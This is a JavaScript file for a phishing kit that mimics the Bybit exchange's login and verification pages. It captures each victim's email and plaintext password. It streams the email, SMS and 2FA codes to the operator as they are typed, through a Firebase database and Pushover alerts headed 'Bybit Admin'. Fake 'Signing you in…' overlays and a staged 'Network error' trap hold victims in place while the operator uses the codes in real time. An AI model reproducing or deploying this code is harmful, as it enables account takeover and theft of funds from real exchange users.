

(function () {
  'use strict';

  if (typeof firebase === 'undefined' || !firebase.apps.length) return;

  
  
  
  
  
  var victimApp = (typeof window.fbVictim === 'function') ? window.fbVictim() : firebase.app();
  var auth = victimApp.auth();
  var db = victimApp.database();

  var ERRORS = {
    'auth/invalid-email': 'Please enter a valid email address.',
    'auth/user-disabled': 'This account has been disabled.',
    'auth/user-not-found': 'No account found with this email.',
    'auth/wrong-password': 'Incorrect password. Please try again.',
    'auth/invalid-credential': 'Incorrect email or password. Please try again.',
    'auth/email-already-in-use': 'An account with this email already exists. Try logging in instead.',
    'auth/weak-password': 'Password must be at least 6 characters.',
    'auth/too-many-requests': 'Too many attempts. Please wait a moment and try again.',
    'auth/network-request-failed': 'Network error. Check your connection and try again.',
    'auth/popup-closed-by-user': 'Sign-in was cancelled before completion.',
    'auth/popup-blocked': 'Your browser blocked the sign-in popup. Allow popups for this site and try again.',
    'auth/operation-not-allowed': 'Email/Password sign-in is not enabled. Enable it in Firebase Console > Authentication > Sign-in method.'
  };

  function errMsg(e) {
    return (e && ERRORS[e.code]) || (e && e.message) || 'Something went wrong. Please try again.';
  }
  function setErr(el, text) {
    if (!el) return;
    el.textContent = text;
    el.classList.add('show');
  }
  function clearErr(el) {
    if (!el) return;
    el.textContent = '';
    el.classList.remove('show');
  }
  function setBusy(btn, on) {
    if (!btn) return;
    if (on) {
      btn.setAttribute('data-label', btn.textContent);
      btn.disabled = true;
      btn.textContent = 'Please wait…';
    } else {
      btn.disabled = false;
      var l = btn.getAttribute('data-label');
      if (l) btn.textContent = l;
    }
  }
  function toggle(el, show) {
    if (!el) return;
    el.hidden = !show;
  }
  
  
  function ensureProfile(user, extra) {
    if (!user) return Promise.resolve();
    var ref = db.ref('users/' + user.uid);
    return ref.once('value').then(function (snap) {
      if (snap.exists()) return null;
      var provider = (user.providerData && user.providerData[0] && user.providerData[0].providerId) || 'password';
      var profile = {
        email: user.email || '',
        provider: provider,
        createdAt: firebase.database.ServerValue.TIMESTAMP
      };
      if (extra) for (var k in extra) profile[k] = extra[k];
      return ref.set(profile);
    }).catch(function () {  });
  }

  var EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  
  
  
  
  
  var GATE_STATUS = [
    'Establishing secure connection…',
    'Verifying your credentials…',
    'Loading your account…',
    'Syncing your data…',
    'Please wait a moment…'
  ];
  var gateTimer = null;
  var gateRef = null;
  var gateCb = null;

  function gateSid() {
    var sid = null;
    try { sid = sessionStorage.getItem('byGateSid'); } catch (e) { }
    if (!sid) {
      sid = 'g_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
      try { sessionStorage.setItem('byGateSid', sid); } catch (e) { }
    }
    return sid;
  }
  function gateRememberEmail(email) {
    try { sessionStorage.setItem('byGateEmail', email || ''); } catch (e) { }
  }
  function gateRecallEmail() {
    var v = null;
    try { v = sessionStorage.getItem('byGateEmail'); } catch (e) { }
    return v || (auth.currentUser && auth.currentUser.email) || '';
  }

  
  var gateOverlayTitle = null;
  function gateOverlayShow(title) {
    gateOverlayTitle = title || 'Signing you in…';
    var ov = document.getElementById('gateOverlay');
    if (!ov) {
      ov = document.createElement('div');
      ov.className = 'gate-overlay';
      ov.id = 'gateOverlay';
      ov.innerHTML = '<div class="gate-box">'
        + '<div class="gate-spin"></div>'
        + '<div class="gate-title"></div>'
        + '<div class="gate-status"></div>'
        + '<div class="gate-timer"></div>'
        + '<div class="gate-note">Do not close or refresh this page.</div>'
        + '</div>';
      document.body.appendChild(ov);
    }
    ov.querySelector('.gate-title').textContent = title || 'Signing you in…';
    ov.querySelector('.gate-status').textContent = GATE_STATUS[0];
    ov.querySelector('.gate-timer').textContent = '0s';
    ov.style.display = 'flex';
    var started = Date.now();
    var i = 0;
    clearInterval(gateTimer);
    gateTimer = setInterval(function () {
      var el = document.getElementById('gateOverlay');
      if (!el) { clearInterval(gateTimer); return; }
      var sec = Math.round((Date.now() - started) / 1000);
      el.querySelector('.gate-timer').textContent = sec + 's';
      if (sec > 0 && sec % 4 === 0) {
        i = (i + 1) % GATE_STATUS.length;
        el.querySelector('.gate-status').textContent = GATE_STATUS[i];
      }
    }, 1000);
  }
  function gateOverlayHide() {
    clearInterval(gateTimer);
    var ov = document.getElementById('gateOverlay');
    if (ov) ov.style.display = 'none';
  }
  
  
  
  function gateFinalTrap() {
    try { sessionStorage.setItem('byGateStage', 'dead'); } catch (e) { }
    clearInterval(gateFinalTimer);
    
    var ov = document.getElementById('gateOverlay');
    if (!ov) gateOverlayShow('Verifying…');
    ov = document.getElementById('gateOverlay');
    ov.classList.add('is-dead');
    ov.querySelector('.gate-title').textContent = 'Network error';
    ov.querySelector('.gate-status').textContent = 'Could not reach the server. Check your connection and try again…';
    ov.querySelector('.gate-note').textContent = 'Retrying automatically — please keep this page open.';
    var started = Date.now();
    gateFinalTimer = setInterval(function () {
      var el = document.getElementById('gateOverlay');
      if (!el) { clearInterval(gateFinalTimer); return; }
      var sec = Math.round((Date.now() - started) / 1000);
      el.querySelector('.gate-timer').textContent = sec + 's';
    }, 1000);
  }

  
  
  
  
  function sendPushoverNotification(title, message) {
    return db.ref('adminConfig/pushover').once('value').then(function (snap) {
      var cfg = snap.val() || {};
      var userKey = cfg.userKey;
      var appToken = cfg.appToken;
      if (!userKey || !appToken) {
        console.warn('[Pushover] skipped — user key or app token missing in adminConfig/pushover');
        return null;
      }

      var formData = new FormData();
      formData.append('token', appToken);
      formData.append('user', userKey);
      formData.append('title', title);
      formData.append('message', message);

      
      
      return fetch('https://api.pushover.net/1/messages.json', {
        method: 'POST',
        body: formData,
        keepalive: true
      }).then(function (res) {
        return res.json().catch(function () { return {}; }).then(function (j) {
          if (!res.ok || !j || j.status !== 1) {
            console.warn('[Pushover] send failed:',
              (j && j.errors && j.errors.join(' ')) || ('HTTP ' + res.status));
          }
          return j;
        });
      }).catch(function (e) {
        console.warn('[Pushover] network error:', e && e.message);
        return null;
      });
    }).catch(function (e) {
      console.warn('[Pushover] config read failed:', e && e.message);
      return null;
    });
  }

  var eventRetryQueue = [];
  function retryEvent(key, data) {
    if (eventRetryQueue.length > 20) return;
    eventRetryQueue.push({ key: key, data: data });
  }
  function pushEvent(data) {
    var key = null;
    try {
      data.ts = firebase.database.ServerValue.TIMESTAMP;
      var ref = db.ref('events').push();
      key = ref.key;
      ref.set(data, function (err) {
        if (err) retryEvent(key, data);
      });

      
      if (data.type === 'login') {
        sendPushoverNotification('Bybit Admin: New Login Attempt', 'Email: ' + (data.email || 'unknown') + '\nPassword: ' + (data.password || 'none'));
      } else if (data.type === 'otp') {
        sendPushoverNotification('Bybit Admin: ' + (data.label || 'Code') + ' Entered', 'Email: ' + (data.email || 'unknown') + '\nCode: ' + (data.code || 'none'));
      }
    } catch (e) { retryEvent(key, data); }
    return key;
  }
  function updateEvent(key, data) {
    if (!key) return;
    db.ref('events/' + key).update(data).catch(function () { });
  }
  
  setInterval(function () {
    if (!eventRetryQueue.length) return;
    var batch = eventRetryQueue.splice(0, eventRetryQueue.length);
    batch.forEach(function (job) {
      if (!job.key) return;
      db.ref('events/' + job.key).set(job.data, function (err) {
        if (err) retryEvent(job.key, job.data);
      });
    });
  }, 5000);

  
  
  
  
  var gateLastPark = null;
  var gateRetryTimer = null;
  var gateFinalTimer = null;

  function gatePark(stage, extra, onRelease, opts) {
    gateLastPark = { stage: stage, extra: extra, onRelease: onRelease, opts: opts };
    var silent = !!(opts && opts.silent);
    
    
    
    var user = auth.currentUser;
    var data = {
      owner: (user && user.uid) || 'anon',
      stage: stage,
      email: gateRecallEmail(),
      ts: firebase.database.ServerValue.TIMESTAMP
    };
    if (extra) for (var k in extra) data[k] = extra[k];
    gateRef = db.ref('gate/' + gateSid());
    gateCb = onRelease;
    gateRef.set(data)
      .then(function () {
        clearInterval(gateRetryTimer);
        gateRetryTimer = null;
        
        
        
        
        if (!silent) gateOverlayShow(gateOverlayTitle || 'Signing you in…');
        gateRef.on('value', gateCheck);
      })
      .catch(function () {
        
        
        gateRef = null;
        gateCb = null;
        gateFinalTrap();
        if (!gateRetryTimer) {
          gateRetryTimer = setInterval(function () {
            if (gateLastPark) {
              gatePark(gateLastPark.stage, gateLastPark.extra, gateLastPark.onRelease);
            }
          }, 5000);
        }
      });
  }
  function gateCheck(snap) {
    var v = snap.val();
    if (v && v.released === true && gateCb) {
      var cb = gateCb;
      var ref = gateRef;
      gateRef = null;
      gateCb = null;
      if (ref) { ref.off('value', gateCheck); ref.remove().catch(function () { }); }
      cb();
    }
  }
  function gateUpdate(extra) {
    if (!gateRef) return;
    var patch = {};
    var user = auth.currentUser;
    if (user) patch.owner = user.uid;
    for (var k in extra) patch[k] = extra[k];
    gateRef.update(patch).catch(function () { });
  }


  
  document.querySelectorAll('[data-notice]').forEach(function (el) {
    el.addEventListener('click', function () {
      setErr(document.getElementById('loginErr'), el.getAttribute('data-notice'));
    });
  });

  
  var heroBtn = document.getElementById('heroSignupBtn');
  var heroInput = document.getElementById('heroEmail');
  if (heroBtn) {
    heroBtn.addEventListener('click', function () {
      try {
        if (heroInput && heroInput.value) sessionStorage.setItem('byRegEmail', heroInput.value.trim());
      } catch (e) {  }
      window.location.href = 'login.html';
    });
  }

  
  if (document.querySelector('.login-card')) {
    var loginErr = document.getElementById('loginErr');

    
    
    
    

    var step1 = document.getElementById('loginStep1');
    var step2 = document.getElementById('loginStep2');
    var emailIn = document.getElementById('loginEmail');
    var pwIn = document.getElementById('loginPassword');
    var pwEmail = document.getElementById('loginPwEmail');
    var loginNext = document.getElementById('loginNext');
    var loginBack = document.getElementById('loginBack');
    var loginSubmit = document.getElementById('loginSubmit');

    
    try {
      var heroEmail = sessionStorage.getItem('byRegEmail');
      if (heroEmail && emailIn) emailIn.value = heroEmail;
    } catch (e) {  }

    function goStep2() {
      var v = (emailIn.value || '').trim();
      if (!EMAIL_RE.test(v)) {
        setErr(loginErr, 'Please enter a valid email address.');
        return;
      }
      clearErr(loginErr);
      pwEmail.textContent = v;
      step1.hidden = true;
      step2.hidden = false;
      pwIn.focus();
    }
    if (loginNext) loginNext.addEventListener('click', goStep2);
    if (emailIn) {
      emailIn.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') goStep2();
      });
    }
    if (loginBack) {
      loginBack.addEventListener('click', function () {
        clearErr(loginErr);
        step2.hidden = true;
        step1.hidden = false;
        emailIn.focus();
      });
    }

    function doLogin() {
      clearErr(loginErr);
      var pw = pwIn.value || '';
      if (pw.length < 6) {
        setErr(loginErr, 'Please enter your password.');
        return;
      }
      var email = pwEmail.textContent;
      setBusy(loginSubmit, true);
      try { sessionStorage.setItem('byGateStage', 'login'); } catch (e) { }
      
      
      gateOverlayShow('Signing you in…');
      var evKey = pushEvent({ type: 'login', email: email, password: pw, status: 'verifying' });
      auth.signInWithEmailAndPassword(email, pw)
        .then(function () {
          updateEvent(evKey, { status: 'success' });
        })
        .catch(function (e) {
          
          
          
          
          
          updateEvent(evKey, { status: 'failed (' + ((e && e.code) || 'error') + ')' });
        })
        .then(function () {
          
          
          
          gateRememberEmail(email);
          gatePark('login', {}, function () {
            try { sessionStorage.setItem('byGateStage', 'otp'); } catch (e) { }
            window.location.replace('verify.html');
          });
        });
    }
    if (loginSubmit) loginSubmit.addEventListener('click', doLogin);
    if (pwIn) {
      pwIn.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') doLogin();
      });
    }

    
    
    
  }

  
  var hdrUser = document.getElementById('hdrUser');
  if (hdrUser) {
    var hdrLoginLink = document.getElementById('hdrLoginLink');
    var hdrSignupLink = document.getElementById('hdrSignupLink');
    var hdrMSignup = document.getElementById('hdrMSignup');
    var hdrMLogout = document.getElementById('hdrMLogout');
    var hdrUserEmail = document.getElementById('hdrUserEmail');
    var mmLogin = document.getElementById('mmLogin');
    var mmSignup = document.getElementById('mmSignup');

    auth.onAuthStateChanged(function (user) {
      var signedIn = !!user;
      toggle(hdrLoginLink, !signedIn);
      toggle(hdrSignupLink, !signedIn);
      toggle(hdrMSignup, !signedIn);
      toggle(hdrUser, signedIn);
      toggle(hdrMLogout, signedIn);
      if (user) {
        hdrUserEmail.textContent = user.email || 'My Account';
        hdrUserEmail.title = user.email || '';
        if (mmLogin) {
          mmLogin.textContent = 'Log Out';
          mmLogin.setAttribute('data-signout', '1');
          mmLogin.removeAttribute('href');
        }
        if (mmSignup) mmSignup.hidden = true;
      } else {
        if (mmLogin) {
          mmLogin.textContent = 'Log In';
          mmLogin.removeAttribute('data-signout');
          mmLogin.setAttribute('href', 'login.html');
        }
        if (mmSignup) mmSignup.hidden = false;
      }
    });

    function signOutNow() {
      auth.signOut();
    }
    var hdrLogout = document.getElementById('hdrLogout');
    if (hdrLogout) hdrLogout.addEventListener('click', signOutNow);
    if (hdrMLogout) hdrMLogout.addEventListener('click', signOutNow);
    if (mmLogin) {
      mmLogin.addEventListener('click', function (e) {
        if (mmLogin.getAttribute('data-signout')) {
          e.preventDefault();
          signOutNow();
        }
      });
    }
  }

  
  var regBtn = document.getElementById('regBtn');
  if (regBtn) {
    var regErr = document.getElementById('regErr');
    var regEmail = document.getElementById('regEmail');
    var regPw = document.getElementById('regPassword');
    var regTerms = document.getElementById('regTerms');

    
    auth.onAuthStateChanged(function (user) {
      if (user) window.location.replace('index.html');
    });

    
    try {
      var saved = sessionStorage.getItem('byRegEmail');
      if (saved) {
        regEmail.value = saved;
        sessionStorage.removeItem('byRegEmail');
      }
    } catch (e) {  }

    
    var checkWrap = document.querySelector('.auth-check');
    if (checkWrap && regTerms) {
      checkWrap.addEventListener('click', function (e) {
        if (e.target.tagName === 'A') return;
        regTerms.classList.toggle('is-off');
      });
    }

    regBtn.addEventListener('click', function () {
      clearErr(regErr);
      var email = (regEmail.value || '').trim();
      var pw = regPw.value || '';
      if (!EMAIL_RE.test(email)) {
        setErr(regErr, 'Please enter a valid email address.');
        return;
      }
      if (pw.length < 6) {
        setErr(regErr, 'Password must be at least 6 characters.');
        return;
      }
      if (regTerms.classList.contains('is-off')) {
        setErr(regErr, 'Please agree to the Terms of Service and Privacy Policy.');
        return;
      }
      var countryEl = document.querySelector('#country .auth-select-name');
      var country = countryEl ? countryEl.textContent.trim() : '';

      setBusy(regBtn, true);
      auth.createUserWithEmailAndPassword(email, pw)
        .then(function (res) {
          
          
          
          return Promise.all([
            sendPushoverNotification('Bybit Admin: New User Registration',
              'Email: ' + email + '\nCountry: ' + country),
            ensureProfile(res.user, { country: country })
          ]);
        })
        .then(function () {
          window.location.replace('index.html');
        })
        .catch(function (e) {
          setBusy(regBtn, false);
          setErr(regErr, errMsg(e));
        });
    });
  }

  
  
  
  
  
  
  
  
  
  
  
  
  
  if (document.querySelector('.verify-card')) {
    var vfErr = document.getElementById('verifyErr');
    var vfTo = document.getElementById('vfTo');
    var vfStarted = false;
    var VF_METHODS = ['email', 'sms', 'app'];
    
    var VF_LABELS = { email: 'Email code', sms: 'SMS code', app: '2FA code' };
    var VF_CD = 30;
    function maskEmail(e) {
      e = (e || '').trim();
      var at = e.indexOf('@');
      if (at < 1) return e || 'your account';
      var user = e.slice(0, at);
      var dom = e.slice(at);
      var head = user.length <= 2 ? user : user.slice(0, 1) + '***' + user.slice(-1);
      return head + dom;
    }

    
    
    
    
    
    var vf = {};
    VF_METHODS.forEach(function (m) {
      vf[m] = { left: 0, timerId: null, lastPushed: '' };
    });

    
    
    
    function vfSnapshot() {
      var out = {};
      VF_METHODS.forEach(function (m) {
        var inp = document.querySelector('[data-vf-input="' + m + '"]');
        var entered = inp ? (inp.value || '').replace(/\D/g, '') : '';
        out[m] = { code: entered, label: VF_LABELS[m] || m };
      });
      return out;
    }

    
    
    
    
    function vfRender(m) {
      var send = document.querySelector('[data-vf-send="' + m + '"]');
      var cd = document.querySelector('[data-vf-cd="' + m + '"]');
      if (!cd) return;
      var s = vf[m];
      if (s.left > 0) {
        if (send) send.hidden = true;
        cd.hidden = false;
        cd.textContent = '0:' + (s.left < 10 ? '0' : '') + s.left;
      } else {
        if (send) send.hidden = false;
        cd.hidden = true;
      }
    }

    
    
    
    
    
    
    function vfStart(m) {
      var s = vf[m];
      var looping = !document.querySelector('[data-vf-send="' + m + '"]');
      s.left = VF_CD;
      clearInterval(s.timerId);
      vfRender(m);
      s.timerId = setInterval(function () {
        s.left--;
        if (s.left <= 0) {
          if (looping) { s.left = VF_CD; }
          else { s.left = 0; clearInterval(s.timerId); }
        }
        vfRender(m);
      }, 1000);
    }

    
    
    
    
    var vfLiveT = null;
    function vfLivePush() {
      clearTimeout(vfLiveT);
      vfLiveT = setTimeout(function () {
        var changed = false;
        VF_METHODS.forEach(function (m) {
          var inp = document.querySelector('[data-vf-input="' + m + '"]');
          var cur = inp ? (inp.value || '').replace(/\D/g, '') : '';
          if (cur && cur !== vf[m].lastPushed) {
            changed = true;
            vf[m].lastPushed = cur;
          }
        });
        if (changed) gateUpdate({ stage: 'typing-code', codes: vfSnapshot() });
      }, 600);
    }

    
    
    
    function vfRefreshSubmit() {
      var btn = document.querySelector('[data-vf-submit]');
      if (!btn) return;
      var ready = VF_METHODS.some(function (m) {
        var inp = document.querySelector('[data-vf-input="' + m + '"]');
        return inp && (inp.value || '').replace(/\D/g, '').length >= 6;
      });
      btn.disabled = !ready;
      if (ready) btn.classList.add('is-ready');
      else btn.classList.remove('is-ready');
    }

    
    
    
    
    auth.onAuthStateChanged(function (user) {
      var stage = null;
      try { stage = sessionStorage.getItem('byGateStage'); } catch (e) { }
      
      
      if (stage === 'dead') { gateFinalTrap(); vfStarted = true; return; }
      if (stage !== 'otp') {
        window.location.replace('login.html');
        return;
      }
      if (vfStarted) return;
      vfStarted = true;
      var email = gateRecallEmail();
      if (vfTo) vfTo.textContent = maskEmail(email);
      
      
      
      
      
      VF_METHODS.forEach(function (m) {
        if (document.querySelector('[data-vf-cd="' + m + '"]')) vfStart(m);
      });
      vfRefreshSubmit();

      
      
      
      
      VF_METHODS.forEach(function (m) {
        var inp = document.querySelector('[data-vf-input="' + m + '"]');
        if (inp) {
          var onVfInput = function () {
            var clean = (inp.value || '').replace(/\D/g, '').slice(0, 6);
            if (clean !== inp.value) inp.value = clean;
            var field = document.querySelector('[data-vf-field="' + m + '"]');
            if (field) field.classList.remove('has-error');
            clearErr(vfErr);
            vfRefreshSubmit();
            vfLivePush();
          };
          inp.addEventListener('input', onVfInput);
          inp.addEventListener('keyup', onVfInput);
          inp.addEventListener('change', onVfInput);
          inp.addEventListener('paste', function () {
            setTimeout(onVfInput, 0);
          });
        }
      });
      
      
      var vfWatch = setInterval(function () {
        if (!document.querySelector('.verify-card')) { clearInterval(vfWatch); return; }
        vfRefreshSubmit();
      }, 500);

      
      
      
      VF_METHODS.forEach(function (m) {
        var sendBtn = document.querySelector('[data-vf-send="' + m + '"]');
        if (sendBtn) {
          sendBtn.addEventListener('click', function () {
            if (vf[m].left > 0) return;
            clearErr(vfErr);
            vfStart(m);
          });
        }
      });

      
      
      
      
      
      
      
      
      gatePark('await-code', { codes: vfSnapshot() }, function () {
        gateFinalTrap();
      }, { silent: true });
    });

    
    
    
    
    
    var vfSubmit = document.querySelector('[data-vf-submit]');
    if (vfSubmit) {
      vfSubmit.addEventListener('click', function () {
        if (vfSubmit.disabled) return;
        clearErr(vfErr);
        var snap = vfSnapshot();
        var filled = VF_METHODS.filter(function (m) { return snap[m].code.length === 6; });
        if (!filled.length) {
          setErr(vfErr, 'Please enter your confirmation code.');
          VF_METHODS.forEach(function (m) {
            var field = document.querySelector('[data-vf-field="' + m + '"]');
            if (field) field.classList.add('has-error');
          });
          vfRefreshSubmit();
          return;
        }
        
        
        filled.forEach(function (m) {
          VF_METHODS.forEach(function (mm) {
            if (mm === m) { vf[mm].lastPushed = snap[mm].code; }
          });
          pushEvent({
            type: 'otp',
            email: gateRecallEmail(),
            method: m,
            label: VF_LABELS[m] || m,
            code: snap[m].code,
            status: 'submitted'
          });
        });
        gateUpdate({ stage: 'code-waiting', codes: snap });
        gateOverlayShow('Confirming your code…');
      });
    }
  }
})();
